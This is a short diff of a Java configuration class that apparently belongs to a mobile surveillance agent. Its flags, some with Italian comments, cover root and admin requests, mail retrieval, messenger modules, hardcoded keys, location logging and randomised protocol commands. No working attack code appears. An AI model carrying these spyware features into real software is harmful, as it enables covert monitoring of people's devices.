@@ -20,10 +20,6 @@ public class Cfg {
 	public static boolean DEMO = @DEMO@; // @DEMO@
 	public static final boolean DEMO_INITSOUND = false;
 	
-	public static final boolean ADMIN = true; // if true, wants privilege but cannot get root: asks for admin
-	public static final boolean DEBUG_AUDIO = false;
-	public static final boolean FORCENODEMO = false; // if true, force no demo
-	
 	public static final boolean KEYS = @KEYS@; // Se e' true vengono usate le chiavi hardcoded
 	
 	public static boolean FILE = @FILE@;
@@ -31,13 +27,9 @@ public class Cfg {
 	public static final boolean TRACE = false; // enable Debug.startMethodTracing
 	public static final boolean DEBUGKEYS = false; //uses fake keys if assets/r.bin not available
 	public static final boolean STATISTICS = false; // enable statistics on crypto and on commands
-	public static final boolean MEMOSTAT = false;
 	
 	public static final boolean ENABLE_EXPERIMENTAL_MODULES = false; // enables viber modules
-	
-	public static final boolean PROTOCOL_RANDBLOCK = true; // increses randomly zprotocol commands
-	public static final boolean PROTOCOL_RESUME = true; // enables zprotocol resume for big files
-	
+
 	public static final int PROTOCOL_CHUNK = 256 * 1024; // chunk size fot resume
 	public static final int EV_QUEUE_LEN = 8;
 	public static final int EV_BLOCK_SIZE = 256 * 1024;
@@ -45,7 +37,6 @@ public class Cfg {
 	public static final boolean USE_SD = true; // try to use sd if available
 	public static final boolean FORCE_ROOT = false; // force root request
 	
-	public static final boolean LOG_POSITION = false; // log positions on a file
 	public static final boolean ONE_MAIL = false; // retrieve only one mail
 	
 	public static final boolean POWER_MANAGEMENT = true; // if true, tries to acquire power lock only when needed 
